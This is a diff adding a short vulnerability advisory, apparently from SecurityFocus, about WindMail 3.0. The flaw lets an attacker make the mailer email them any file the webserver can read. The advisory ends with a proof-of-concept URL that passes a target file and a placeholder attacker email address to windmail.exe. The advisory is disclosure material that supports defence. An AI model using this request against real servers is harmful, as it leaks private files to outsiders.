@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/1073/info
+
+WindMail is a command-line mailer that can be integrated with perl cgi applications to create form-mail capability for a website.
+
+WindMail 3.0 and possibly previous versions can be used to retrieve any ascii file that the webserver has read access to, provided the path and filename is known to the attacker. If the attacker has write access anywhere on the system and can determine the path to the writable directory, any file whether ascii or binary can be retrieved.
+
+WindMail operates in two modes: "command line" and "header parsing".
+
+In command line mode, all delivery options are specified at the command line as switch values, and the -n switch specifies a file name to send as the message body. In this mode, an attacker can specify any file that the webserver has read access to, and an email address to send that file to.
+
+In header parsing mode, a file is specified with the -n switch that contains a set of headers at the beginning of the file, separated from the message body by a single blank line. Therefore, if an attacker can create a file on the system that includes an 'Attach:' header, they can then specify that file with the -n switch and wait for the file listed in the 'Attach' header to arrive via email. 
+
+To retrieve any known ascii file from the target webserver, enter a URL like:
+http: //target/cgi-bin/windmail.exe?%20-n%20desired.file%20attacker_email_address 
